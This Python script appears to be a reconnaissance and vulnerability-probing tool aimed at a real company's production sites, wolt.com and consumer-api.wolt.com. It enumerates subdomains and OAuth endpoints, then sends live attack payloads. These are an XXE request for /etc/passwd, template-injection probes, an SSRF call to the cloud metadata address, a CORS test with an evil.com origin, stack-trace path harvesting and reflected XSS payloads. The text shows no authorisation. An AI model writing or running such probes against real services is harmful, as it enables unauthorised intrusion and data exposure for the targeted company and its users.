"""Quick probe: subdomains, OAuth, misc."""
import requests, time

h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Origin': 'https://wolt.com'}

# ===== 1. SUBDOMAINS =====
print("=== 1. SUBDOMAINS ===")
subs = [
    'https://api.wolt.com/', 'https://admin.wolt.com/', 'https://partner.wolt.com/',
    'https://merchant.wolt.com/', 'https://courier.wolt.com/', 'https://support.wolt.com/',
    'https://blog.wolt.com/', 'https://careers.wolt.com/', 'https://investors.wolt.com/',
    'https://status.wolt.com/', 'https://cdn.wolt.com/', 'https://static.wolt.com/',
    'https://assets.wolt.com/', 'https://images.wolt.com/', 'https://payments.wolt.com/',
    'https://billing.wolt.com/', 'https://analytics.wolt.com/', 'https://internal.wolt.com/',
    'https://staging.wolt.com/', 'https://dev.wolt.com/', 'https://test.wolt.com/',
    'https://v2.wolt.com/', 'https://m.wolt.com/',
]
for sub in subs:
    try:
        r = requests.get(sub, headers=h, timeout=8, allow_redirects=True)
        final = r.url
        redirected = sub != final
        print(f'  {sub.split("/")[2]:30s}: {r.status_code:3d} -> {final[:80]} {"(redirect)" if redirected else ""}')
    except Exception as e:
        err = str(e)[:60]
        if 'Name or service not known' not in err and 'getaddrinfo' not in err.lower():
            print(f'  {sub.split("/")[2]:30s}: {err}')

# ===== 2. OAUTH =====
print("\n=== 2. OAUTH ===")
oauth_paths = [
    'https://authentication.wolt.com/.well-known/openid-configuration',
    'https://authentication.wolt.com/.well-known/oauth-authorization-server',
    'https://authentication.wolt.com/authorize',
    'https://authentication.wolt.com/token',
    'https://authentication.wolt.com/userinfo',
    'https://authentication.wolt.com/signup',
    'https://authentication.wolt.com/signin',
    'https://authentication.wolt.com/login',
]
for url in oauth_paths:
    try:
        r = requests.get(url, headers=h, timeout=8, allow_redirects=False)
        if r.status_code not in (404,):
            print(f'  {url}: {r.status_code} | {r.text[:120]}')
    except:
        pass

# ===== 3. CACHE =====
print("\n=== 3. CACHE ===")
for url in ['https://consumer-api.wolt.com/v1/pages/front',
            'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/wolt-market-kamppi/dynamic/',
            'https://wolt.com/']:
    try:
        r = requests.get(url, headers=h, timeout=8)
        for k in ['X-Cache', 'CF-Cache-Status', 'Age', 'Cache-Control', 'Vary']:
            v = r.headers.get(k, '')
            if v:
                print(f'  {url.split("/")[2]:30s} {k}: {v}')
    except:
        pass

# ===== 4. XXE/SSTI/SSRI =====
print("\n=== 4. INJECTION ===")
# XXE
r = requests.post('https://consumer-api.wolt.com/v1/pages/search',
                 data='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                 headers={**h, 'Content-Type': 'application/xml'}, timeout=8)
print(f'  XXE: {r.status_code} | {r.text[:80]}')

# SSTI
for p in ['{{7*7}}', '${7*7}']:
    r = requests.get(f'https://consumer-api.wolt.com/v1/pages/front?q={p}', headers=h, timeout=8)
    if '49' in r.text:
        print(f'  SSTI {p}: POTENTIAL HIT!')
print(f'  SSTI: clean')

# SSRF
r = requests.get('https://consumer-api.wolt.com/v1/pages/front?url=http://169.254.169.254/latest/meta-data/',
                headers=h, timeout=8)
print(f'  SSRF: {r.status_code} | {r.text[:80]}')

# ===== 5. CORS RE-VERIFY on consumer-api ====
print("\n=== 5. CORS DETAILED ===")
# Already confirmed gatekeeper. Now test consumer-api origin reflection
try:
    r = requests.options('https://consumer-api.wolt.com/v1/pages/front',
                        headers={**h, 'Origin': 'https://evil.com', 'Access-Control-Request-Method': 'GET'}, timeout=8)
    acao = r.headers.get('Access-Control-Allow-Origin', '')
    acac = r.headers.get('Access-Control-Allow-Credentials', '')
    if acao:
        print(f'  consumer-api: ACAO={acao} ACAC={acac}')
    else:
        print(f'  consumer-api: no CORS headers')
except:
    pass

# ===== 6. CHECK if checkout error path disclosure also on order-xp endpoints =====
print("\n=== 6. ERROR PATH SCOPE ===")
# Test more order-xp endpoints
for ep in [
    'https://consumer-api.wolt.com/order-xp/web/v1/pages/orders',
    'https://consumer-api.wolt.com/order-xp/web/v1/pages/order',
    'https://consumer-api.wolt.com/order-xp/web/v1/consumer/me',
]:
    try:
        r = requests.post(ep, json={}, headers={**h, 'Content-Type': 'application/json'}, timeout=8)
        import re
        paths = re.findall(r'File\s+"([^"]+\.py)"', r.text)
        if paths:
            print(f'  {ep.split("/")[-1]}: PATH! {paths}')
        elif 'File ' in r.text:
            print(f'  {ep.split("/")[-1]}: has File | {r.text[:120]}')
        else:
            print(f'  {ep.split("/")[-1]}: {r.status_code} | {r.text[:80]}')
    except Exception as e:
        print(f'  {ep.split("/")[-1]}: ERR {e}')

# ===== 7. SEARCH CACHE POISONING via unkeyed query params =====
print("\n=== 7. UNKEYED PARAMS ===")
for param in ['utm_source', 'fbclid', 'gclid', 'ref', 'xss']:
    r = requests.get(f'https://consumer-api.wolt.com/v1/pages/front?{param}=<script>alert(1)</script>', headers=h, timeout=8)
    if '<script>' in r.text:
        print(f'  {param}: REFLECTED XSS!')
print('  unkeyed params: no reflection')

print("\n=== DONE ===")
